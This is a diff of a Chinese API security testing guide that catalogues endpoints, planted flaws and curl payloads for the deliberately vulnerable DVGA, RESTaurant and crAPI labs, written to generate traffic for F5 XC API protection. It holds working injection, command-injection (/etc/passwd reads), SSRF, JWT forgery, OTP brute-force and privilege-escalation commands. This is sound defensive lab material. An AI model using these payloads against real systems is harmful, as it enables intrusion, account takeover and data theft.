@@ -1,6 +1,6 @@
 ---
 title: API 测试指南
-description: 全面的端点目录、漏洞映射和攻击载荷，涵盖 DVGA、RESTaurant 和 crAPI — 用于流量生成和 F5 XC API 防护策略开发的入门参考
+description: DVGA、RESTaurant 和 crAPI 的完整端点目录、漏洞映射及攻击载荷——用于流量生成与 F5 XC API 防护配置文件开发的入门参考
 sidebar:
   order: 8
 i18n:
@@ -10,13 +10,13 @@ i18n:
 
 ## 概述
 
-本指南编目了三个 API 安全测试应用中的所有 API 端点、预设漏洞和攻击载荷。使用它来构建用于 F5 XC API 防护策略开发的流量生成模式。
+本指南对三个 API 安全测试应用中的每个 API 端点、已知漏洞及攻击载荷进行了系统整理。可用于为 F5 XC API 防护配置文件开发构建流量生成模式。
 
-| 应用 | 协议 | 路径 | 端口 | 认证 | 漏洞数量 |
+| 应用 | 协议 | 路径 | 端口 | 认证 | 漏洞 |
 |---|---|---|---|---|---|
 | **DVGA** | GraphQL | `/dvga/` | 80 | 无（管理员：admin/password） | 25 个场景 |
 | **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT（表单编码） | 7 个 OWASP API 2023 类别 |
-| **crAPI** | REST（微服务） | `/` | 8888 | JWT (Bearer) | 18+ 个挑战 |
+| **crAPI** | REST（微服务） | `/` | 8888 | JWT（Bearer） | 18+ 个挑战 |
 
 ### 环境变量
 
@@ -33,7 +33,7 @@ CRAPI="http://<ORIGIN_IP>:8888"
 **GraphiQL IDE：** `GET ${ORIGIN}/dvga/`
 **管理员凭据：** admin / password
 
-所有 DVGA 交互都使用单一端点 (`/dvga/graphql`)，通过 POST 请求发送包含 JSON `{"query":"..."}` 载荷。
+所有 DVGA 交互均使用单一端点（`/dvga/graphql`），通过包含 JSON `{"query":"..."}` 载荷的 POST 请求进行。
 
 ### Schema 概览
 
@@ -48,15 +48,15 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
 
 | 操作 | 类型 | 认证 | 用途 |
 |---|---|---|---|
-| `pastes(public, filter, limit)` | Query | 否 | 列出粘贴内容（filter 参数存在 SQL 注入） |
-| `paste(id)` | Query | 否 | 获取单个粘贴内容 |
-| `me(token)` | Query | 否 | 通过 JWT 获取用户信息（可伪造） |
+| `pastes(public, filter, limit)` | Query | 否 | 列出 paste（filter 参数存在 SQL 注入） |
+| `paste(id)` | Query | 否 | 获取单条 paste |
+| `me(token)` | Query | 否 | 通过 JWT 获取用户（存在伪造漏洞） |
 | `systemHealth` | Query | 否 | 健康检查 |
 | `systemUpdate` | Query | 否 | 慢查询（约 82 秒，DoS 攻击向量） |
 | `systemDiagnostics(cmd)` | Query | admin/password | 执行白名单 OS 命令 |
-| `createPaste(title, content, public)` | Mutation | 否 | 创建粘贴内容（content 可触发 XSS） |
-| `importPaste(host, port, path, scheme)` | Mutation | 否 | 导入远程粘贴内容（SSRF、命令注入） |
-| `uploadPaste(filename, content)` | Mutation | 否 | 上传粘贴内容（路径遍历） |
+| `createPaste(title, content, public)` | Mutation | 否 | 创建 paste（content 存在 XSS） |
+| `importPaste(host, port, path, scheme)` | Mutation | 否 | 导入远程 paste（SSRF、命令注入） |
+| `uploadPaste(filename, content)` | Mutation | 否 | 上传 paste（路径遍历） |
 
 ### 漏洞目录
 
@@ -76,21 +76,21 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
 ```
 
-**资源密集型查询（约 82 秒响应）：**
+**资源密集型查询（响应时间约 82 秒）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{systemUpdate}"}'
 ```
 
-**字段重复（重复字段 500+ 次）：**
+**字段重复（重复字段 500 次以上）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**基于别名的攻击（1000 个别名操作）：**
+**别名攻击（1000 个别名操作）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -99,37 +99,37 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 2. 信息泄露（5 个场景）
 
-**自省查询（完整 schema 枚举）：**
+**自省查询（完整 Schema 枚举）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**字段建议（拼写错误暴露有效字段）：**
+**字段建议（拼写错误揭示有效字段）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{titl}}"}'
 ```
 
-**通过 importPaste 的 SSRF（探测内部服务）：**
+**通过 importPaste 实现 SSRF（探测内部服务）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
 ```
 
-#### 3. 注入攻击（4 个场景）
+#### 3. 注入（4 个场景）
 
-**通过 filter 参数的 SQL 注入：**
+**通过 filter 参数进行 SQL 注入：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
 ```
 
-**通过 createPaste 的存储型 XSS：**
+**通过 createPaste 实现存储型 XSS：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -145,14 +145,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 4. 代码执行（3 个场景）
 
-**通过 importPaste 的 OS 命令注入：**
+**通过 importPaste 进行 OS 命令注入：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
 ```
 
-**通过 systemDiagnostics 的 OS 命令（需要管理员认证）：**
+**通过 systemDiagnostics 执行 OS 命令（需要管理员认证）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -161,14 +161,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 5. 授权绕过（3 个场景）
 
-**JWT 令牌伪造（接受未签名令牌）：**
+**JWT Token 伪造（接受未签名 Token）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
 ```
 
-**通过 uploadPaste 的任意文件写入（路径遍历）：**
+**通过 uploadPaste 任意文件写入（路径遍历）：**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -181,10 +181,10 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 **Swagger UI：** `${ORIGIN}/restaurant/docs`
 **OpenAPI 规范：** `${ORIGIN}/restaurant/openapi.json`
-**认证：** 通过表单编码 POST 到 `/restaurant/token` 获取 JWT
+**认证方式：** 通过表单编码的 POST 请求向 `/restaurant/token` 获取 JWT
 **角色：** Customer（默认）、Employee、Chef（管理员）
 
-### 设置：注册与认证
+### 初始化：注册与认证
 
 ```bash
 # 注册测试用户
@@ -192,7 +192,7 @@ curl -X POST ${ORIGIN}/restaurant/register \
   -H "Content-Type: application/json" \
   -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'
 
-# 获取 JWT 令牌（注意：表单编码，非 JSON）
+# 获取 JWT Token（注意：使用表单编码，而非 JSON）
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
@@ -204,31 +204,31 @@ echo "Bearer token: ${TOKEN}"
 
 | 端点 | 方法 | 认证 | 角色 | 漏洞 |
 |---|---|---|---|---|
-| `/restaurant/register` | POST | 否 | — | 用户注册 |
-| `/restaurant/token` | POST | 否 | — | JWT 弱密钥 (97952) |
+| `/restaurant/register` | POST | 否 | — | 用户创建 |
+| `/restaurant/token` | POST | 否 | — | JWT 弱密钥（97952） |
 | `/restaurant/healthcheck` | GET | 否 | — | 健康检查 |
 | `/restaurant/profile` | GET | 是 | 任意 | 用户资料 |
 | `/restaurant/profile` | PUT | 是 | 任意 | **BOLA**（修改其他用户） |
-| `/restaurant/profile` | PATCH | 是 | 任意 | **BOPLA**（批量赋值角色） |
-| `/restaurant/users/update_role` | PUT | 是 | 任意 | **BFLA**（角色提升） |
+| `/restaurant/profile` | PATCH | 是 | 任意 | **BOPLA**（批量分配角色） |
+| `/restaurant/users/update_role` | PUT | 是 | 任意 | **BFLA**（角色提权） |
 | `/restaurant/menu` | GET | 是 | 任意 | 列出菜单项 |
-| `/restaurant/menu` | PUT | 是 | Employee+ | 创建菜单（通过 image 的 **SSRF**） |
-| `/restaurant/menu/{item_id}` | PUT | 是 | Employee+ | 更新菜单（通过 image 的 **SSRF**） |
-| `/restaurant/menu/{item_id}` | DELETE | 是 | 任意 | **BFLA**（任何用户均可删除） |
+| `/restaurant/menu` | PUT | 是 | Employee+ | 创建菜单（图片存在 **SSRF**） |
+| `/restaurant/menu/{item_id}` | PUT | 是 | Employee+ | 更新菜单（图片存在 **SSRF**） |
+| `/restaurant/menu/{item_id}` | DELETE | 是 | 任意 | **BFLA**（任意用户可删除） |
 | `/restaurant/orders` | GET | 是 | 任意 | **BOLA**（查看所有订单） |
 | `/restaurant/orders` | POST | 是 | 任意 | 创建订单 |
-| `/restaurant/orders/{order_id}` | GET | 是 | 任意 | **BOLA**（访问其他用户订单） |
+| `/restaurant/orders/{order_id}` | GET | 是 | 任意 | **BOLA**（访问他人订单） |
 | `/restaurant/orders/status/{order_id}` | GET | 是 | 任意 | 订单状态 |
 | `/restaurant/admin/stats/disk` | GET | 是 | Chef | **命令注入** |
 | `/restaurant/reset-password` | POST | 否 | — | 密码重置请求 |
 | `/restaurant/reset-password/new-password` | POST | 否 | — | 设置新密码 |
 | `/restaurant/referral-code` | GET | 是 | 任意 | 获取推荐码 |
-| `/restaurant/apply-referral` | POST | 是 | 任意 | 使用推荐码 |
+| `/restaurant/apply-referral` | POST | 是 | 任意 | 应用推荐码 |
 | `/restaurant/discount-coupons` | GET | 是 | 任意 | 列出优惠券 |
 
 ### 漏洞目录
 
-#### API1:2023 — 对象级别授权失效 (BOLA)
+#### API1:2023 — 对象级授权失效（BOLA）
 
 **修改其他用户的资料：**
 ```bash
@@ -238,7 +238,7 @@ curl -X PUT ${ORIGIN}/restaurant/profile \
   -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
 ```
 
-**访问其他用户的订单（枚举偏移量）：**
+**访问其他用户的订单（枚举 offset）：**
 ```bash
 for i in 1 2 3 4 5; do
   curl -sf ${ORIGIN}/restaurant/orders/${i} \
@@ -247,22 +247,22 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### API2:2023 — 认证失效
+#### API2:2023 — 认证机制失效
 
-**JWT 弱密钥暴力破解（密钥为 6 位数字：97952）：**
+**JWT 弱密钥爆破（密钥为 6 位数字：97952）：**
 ```bash
-# 在 jwt.io 解码和伪造令牌
-# 密钥：97952（可通过 hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' 暴力破解）
+# 在 jwt.io 中解码并伪造 Token
+# 密钥：97952（可通过 hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' 爆破）
 
-# 伪造 Chef 令牌：
+# 伪造 Chef 角色 Token：
 # Header: {"alg":"HS256","typ":"JWT"}
 # Payload: {"sub":"chef","exp":9999999999}
 # 使用密钥 97952 签名
 ```
 
-#### API3:2023 — 对象属性级别授权失效 (BOPLA)
+#### API3:2023 — 对象属性级授权失效（BOPLA）
 
-**批量赋值角色从 Customer 到 Chef：**
+**批量分配角色（从 Customer 提升至 Chef）：**
 ```bash
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -270,30 +270,30 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -d '{"role":"Chef"}'
 ```
 
-**提升路径：Customer → Employee → Chef：**
+**提权路径：Customer → Employee → Chef：**
 ```bash
-# 步骤 1：提升为 Employee
+# 第一步：提权至 Employee
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Employee"}'
 
-# 步骤 2：提升为 Chef
+# 第二步：提权至 Chef
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 ```
 
-#### API5:2023 — 功能级别授权失效 (BFLA)
+#### API5:2023 — 功能级授权失效（BFLA）
 
-**以 Customer 身份删除菜单项（应需要 Employee+ 权限）：**
+**以 Customer 身份删除菜单项（本应要求 Employee+ 权限）：**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-**更改其他用户的角色：**
+**修改其他用户的角色：**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -301,22 +301,22 @@ curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -d '{"username":"chef","role":"Customer"}'
 ```
 
-#### API7:2023 — 服务端请求伪造 (SSRF)
+#### API7:2023 — 服务端请求伪造（SSRF）
 
 **通过菜单 image_url 探测内部端点（需要 Employee 角色）：**
 ```bash
-# 首先通过 BOPLA 提升为 Employee，然后：
+# 先通过 BOPLA 提权至 Employee，然后：
 curl -X PUT ${ORIGIN}/restaurant/menu \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
 ```
 
-#### API8:2023 — 注入攻击
+#### API8:2023 — 注入
 
-**通过磁盘统计的 OS 命令注入（需要 Chef 角色）：**
+**通过磁盘统计端点进行 OS 命令注入（需要 Chef 角色）：**
 ```bash
-# 提升为 Chef 后：
+# 提权至 Chef 后：
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
   -H "Authorization: Bearer ${TOKEN}"
 
@@ -324,7 +324,7 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### 完整攻击链：从普通用户到 Root
+### 完整攻击链：从 Customer 到 Root
 
 ```bash
 # 1. 注册
@@ -332,21 +332,21 @@ curl -X POST ${ORIGIN}/restaurant/register \
   -H "Content-Type: application/json" \
   -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'
 
-# 2. 获取令牌
+# 2. 获取 Token
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
-# 3. 提升为 Chef（BOPLA）
+# 3. 提权至 Chef（BOPLA）
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 
-# 4. 重新认证以获取 Chef 级别令牌
+# 4. 重新认证以获取 Chef 级别 Token
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
-# 5. 命令注入（远程代码执行）
+# 5. 命令注入（RCE）
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
@@ -356,11 +356,11 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 ## crAPI（OWASP Completely Ridiculous API）
 
 **Web UI：** `${CRAPI}/`
-**MailHog：** `${CRAPI}/mailhog/`（邮件捕获用于验证）
-**认证：** JWT Bearer 令牌（RS256，存在算法混淆漏洞）
+**MailHog：** `${CRAPI}/mailhog/`（邮件捕获，用于验证）
+**认证方式：** JWT Bearer Token（RS256，存在算法混淆漏洞）
 **架构：** 7 个微服务（identity、community、workshop、postgres、mongo、mailhog、web）
 
-### 设置：注册、验证邮箱、登录
+### 初始化：注册、验证邮箱、登录
 
 ```bash
 # 1. 注册
@@ -369,7 +369,7 @@ curl -X POST ${CRAPI}/identity/api/auth/signup \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
 # 2. 在 MailHog 中查看验证邮件
-# 浏览 ${CRAPI}/mailhog/ 或使用 MailHog API：
+# 访问 ${CRAPI}/mailhog/ 或使用 MailHog API：
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
 msgs = json.load(sys.stdin)['items']
@@ -377,7 +377,7 @@ for m in msgs:
     print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
 "
 
-# 3. 登录并获取 JWT 令牌
+# 3. 登录并获取 JWT Token
 TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
@@ -387,41 +387,41 @@ echo "Bearer token: ${TOKEN}"
 
 ### 端点参考
 
-#### 身份服务
+#### Identity 服务
 
 | 端点 | 方法 | 认证 | 漏洞 |
 |---|---|---|---|
 | `/identity/api/auth/signup` | POST | 否 | 注册 |
-| `/identity/api/auth/login` | POST | 否 | JWT 令牌（算法混淆） |
+| `/identity/api/auth/login` | POST | 否 | JWT Token（算法混淆） |
 | `/identity/api/auth/forget-password` | POST | 否 | 请求 OTP |
-| `/identity/api/auth/v2/check-otp` | POST | 否 | **无速率限制**（暴力破解 4 位 OTP） |
+| `/identity/api/auth/v2/check-otp` | POST | 否 | **无速率限制**（爆破 4 位 OTP） |
 | `/identity/api/auth/v3/check-otp` | POST | 否 | 有速率限制的版本 |
 | `/identity/api/v2/user/dashboard` | GET | 是 | 用户资料 |
-| `/identity/api/v2/user/change-email` | PUT | 是 | 更改邮箱 |
+| `/identity/api/v2/user/change-email` | PUT | 是 | 修改邮箱 |
 | `/identity/api/v2/vehicle/vehicles` | GET | 是 | 列出车辆（泄露 UUID） |
-| `/identity/api/v2/vehicle/{uuid}/location` | GET | 是 | **BOLA**（任意用户的车辆） |
+| `/identity/api/v2/vehicle/{uuid}/location` | GET | 是 | **BOLA**（访问任意用户的车辆） |
 | `/identity/api/v2/user/videos` | POST | 是 | 视频上传 |
-| `/identity/api/v2/user/videos/{id}` | GET | 是 | **数据泄露**（conversion_params） |
+| `/identity/api/v2/user/videos/{id}` | GET | 是 | **数据暴露**（conversion_params） |
 | `/identity/api/v2/user/videos/{id}` | PUT | 是 | **批量赋值**（命令注入） |
-| `/identity/api/v2/admin/videos/{id}` | DELETE | 是 | **BFLA**（未检查管理员权限） |
+| `/identity/api/v2/admin/videos/{id}` | DELETE | 是 | **BFLA**（无管理员权限检查） |
 
-#### 社区服务
+#### Community 服务
 
 | 端点 | 方法 | 认证 | 漏洞 |
 |---|---|---|---|
-| `/community/api/v2/community/posts` | GET | 是 | **数据泄露**（泄露 vehicle_id、email） |
+| `/community/api/v2/community/posts` | GET | 是 | **数据暴露**（泄露 vehicle_id、email） |
 | `/community/api/v2/community/posts` | POST | 是 | 创建博客文章 |
 | `/community/api/v2/community/posts/{id}/comments` | POST | 是 | 添加评论 |
 | `/community/api/v2/coupon/validate-coupon` | POST | 是 | **NoSQL 注入** |
 
-#### 工作坊服务
+#### Workshop 服务
 
 | 端点 | 方法 | 认证 | 漏洞 |
 |---|---|---|---|
-| `/workshop/api/mechanic` | GET | 是 | **数据泄露**（技师邮箱） |
-| `/workshop/api/mechanic/mechanic_report` | GET | 否 | **BOLA**（无认证，顺序 ID） |
+| `/workshop/api/mechanic` | GET | 是 | **数据暴露**（技师邮箱泄露） |
+| `/workshop/api/mechanic/mechanic_report` | GET | 否 | **BOLA**（无需认证，顺序 ID） |
 | `/workshop/api/merchant/contact_mechanic` | POST | 是 | **SSRF** + **DoS** |
-| `/workshop/api/shop/products` | GET | 是 | 产品目录 |
+| `/workshop/api/shop/products` | GET | 是 | 商品目录 |
 | `/workshop/api/shop/orders/` | POST | 是 | 创建订单 |
 | `/workshop/api/shop/orders/all` | GET | 是 | 列出订单 |
 | `/workshop/api/shop/orders/{id}` | GET | 否 | **BOLA**（无需认证） |
@@ -433,7 +433,7 @@ echo "Bearer token: ${TOKEN}"
 #### 挑战 1 — BOLA：访问其他用户的车辆位置
 
 ```bash
-# 首先获取您的车辆 UUID
+# 先获取自己的车辆 UUID
 curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
   -H "Authorization: Bearer ${TOKEN}"
 
@@ -442,10 +442,10 @@ curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### 挑战 2 — BOLA：访问技师报告（无需认证）
+#### 挑战 2 — BOLA：无需认证访问技师报告
 
 ```bash
-# 顺序 ID 枚举 — 无需令牌
+# 顺序 ID 枚举——无需 Token
 for i in 1 2 3 4 5; do
   echo "Report $i:"
   curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
@@ -453,15 +453,15 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### 挑战 3 — 认证失效：暴力破解密码重置 OTP
+#### 挑战 3 — 认证失效：爆破密码重置 OTP
 
 ```bash
-# 为受害者请求 OTP
+# 为目标用户请求 OTP
 curl -X POST ${CRAPI}/identity/api/auth/forget-password \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
-# 暴力破解 4 位 OTP（v2 无速率限制）
+# 爆破 4 位 OTP（v2 无速率限制）
 for otp in $(seq -w 0000 9999); do
   RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
     -H "Content-Type: application/json" \
@@ -470,14 +470,14 @@ for otp in $(seq -w 0000 9999); do
 done
 ```
 
-#### 挑战 4 — 数据泄露：泄露技师邮箱
+#### 挑战 4 — 数据暴露：泄露技师邮箱
 
 ```bash
 curl -sf ${CRAPI}/workshop/api/mechanic \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
 ```
 
-#### 挑战 5 — 数据泄露：内部视频转换参数
+#### 挑战 5 — 数据暴露：内部视频转换参数泄露
 
 ```bash
 # 上传视频，然后检查响应
@@ -486,7 +486,7 @@ curl -sf ${CRAPI}/identity/api/v2/user/videos \
 # 在响应中查找 conversion_params 字段
 ```
 
-#### 挑战 6 — DoS：通过联系技师的七层 DoS
+#### 挑战 6 — DoS：通过 Contact Mechanic 发起 7 层攻击
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -510,7 +510,7 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### 挑战 8 和 9 — 批量赋值：通过订单操纵获取免费商品
+#### 挑战 8 & 9 — 批量赋值：通过订单操纵获取免费商品
 
 ```bash
 # 将 GET 改为 PUT，修改 status 和 quantity
@@ -520,7 +520,7 @@ curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
   -d '{"status":"returned","quantity":100}'
 ```
 
-#### 挑战 10 — 通过视频转换参数的命令注入
+#### 挑战 10 — 通过视频转换参数进行命令注入
 
 ```bash
 curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
@@ -529,7 +529,7 @@ curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
   -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
 ```
 
-#### 挑战 11 — 通过联系技师的 SSRF
+#### 挑战 11 — 通过 Contact Mechanic 实现 SSRF
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
@@ -545,7 +545,7 @@ curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
   }'
 ```
 
-#### 挑战 12 — NoSQL 注入：提取优惠券代码
+#### 挑战 12 — NoSQL 注入：提取优惠券码
 
 ```bash
 curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
@@ -554,7 +554,7 @@ curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
   -d '{"coupon_code":{"$ne":1}}'
 ```
 
-#### 挑战 13 — SQL 注入：多次兑换优惠券
+#### 挑战 13 — SQL 注入：重复兑换优惠券
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
@@ -563,10 +563,10 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### 挑战 14 — 未认证的订单访问
+#### 挑战 14 — 未认证订单访问
 
 ```bash
-# 无 Authorization 头 — 仍然返回数据
+# 无需 Authorization 请求头——仍可返回数据
 for i in 1 2 3 4 5; do
   curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
   echo ""
@@ -576,10 +576,10 @@ done
 #### 挑战 15 — JWT 算法混淆
 
 ```bash
-# 使用 "none" 算法伪造 JWT（无签名验证）：
-# 1. 设置 header: {"alg":"none","typ":"JWT"} 并进行 base64url 编码
-# 2. 设置 payload: {"email":"admin@example.com","role":"admin"} 并进行 base64url 编码
-# 3. 用点号连接，签名部分留空: <header>.<payload>.
+# 伪造算法为 "none" 的 JWT（无需签名验证）：
+# 1. 设置 Header：{"alg":"none","typ":"JWT"} 并进行 base64url 编码
+# 2. 设置 Payload：{"email":"admin@example.com","role":"admin"} 并进行 base64url 编码
+# 3. 用点号连接，签名留空：<header>.<payload>.
 HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 FORGED="${HEADER}.${PAYLOAD}."
@@ -595,24 +595,24 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 | OWASP 类别 | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
 | **API1: BOLA** | — | `PUT /profile`、`GET /orders/{id}` | 车辆位置、技师报告、订单 |
-| **API2: 认证失效** | JWT 伪造（`me` 查询） | JWT 弱密钥 (97952) | OTP 暴力破解 (v2)、JWT 算法混淆 |
-| **API3: BOPLA** | — | `PATCH /profile`（角色提升） | 视频 conversion_params、技师邮箱泄露 |
-| **API4: 资源消耗** | 批量、递归、别名、字段重复 DoS | 通过响应长度的用户枚举 | `contact_mechanic` repeat_request DoS |
-| **API5: BFLA** | — | `DELETE /menu`、`PUT /users/update_role` | 普通用户 `DELETE /admin/videos` |
-| **API6: 批量赋值** | — | `PUT /orders`（status、quantity） | 订单状态/数量、视频 conversion_params |
+| **API2: 认证失效** | JWT 伪造（`me` 查询） | JWT 弱密钥（97952） | OTP 爆破（v2）、JWT 算法混淆 |
+| **API3: BOPLA** | — | `PATCH /profile`（角色提权） | 视频 conversion_params、技师邮箱暴露 |
+| **API4: 资源消耗** | 批量、递归、别名、字段重复 DoS | 通过响应长度枚举用户 | `contact_mechanic` repeat_request DoS |
+| **API5: BFLA** | — | `DELETE /menu`、`PUT /users/update_role` | 以普通用户身份调用 `DELETE /admin/videos` |
+| **API6: 批量赋值** | — | `PUT /orders`（status、quantity） | 订单 status/quantity、视频 conversion_params |
 | **API7: SSRF** | `importPaste` mutation | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
-| **API8: 注入** | SQL (`filter`)、XSS (`content`)、OS 命令 (`importPaste`、`systemDiagnostics`) | OS 命令 (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`)、SQL (`apply_coupon`) |
-| **API9: 资产管理不当** | — | — | 已弃用的 `/auth/v2/check-otp`（无速率限制） |
-| **API10: 不安全的消费** | — | — | （通过 SSRF 间接实现） |
-| **GraphQL 特有** | 自省、批量处理、递归、别名、字段重复、循环片段 | — | — |
+| **API8: 注入** | SQL（`filter`）、XSS（`content`）、OS 命令（`importPaste`、`systemDiagnostics`） | OS 命令（`/admin/stats/disk?parameters=`） | NoSQL（`validate-coupon`）、SQL（`apply_coupon`） |
+| **API9: 资产管理不当** | — | — | 已废弃的 `/auth/v2/check-otp`（无速率限制） |
+| **API10: 不安全的第三方 API 消费** | — | — | （通过 SSRF 间接触发） |
+| **GraphQL 特有** | 自省查询、批量请求、递归、别名、字段重复、循环片段 | — | — |
 
 ---
 
 ## 流量生成模式
 
-### 阶段 1：基线（正常路径）
+### 阶段一：基线流量（正常路径）
 
-在测试攻击模式之前，生成合法流量以建立正常的 API 行为基线。
+在测试攻击模式之前，先生成合法流量以建立正常 API 行为基准。
 
 **DVGA 基线：**
 ```bash
@@ -635,33 +635,33 @@ curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### 阶段 2：按 OWASP 类别的攻击流量
+### 阶段二：按 OWASP 类别划分的攻击流量
 
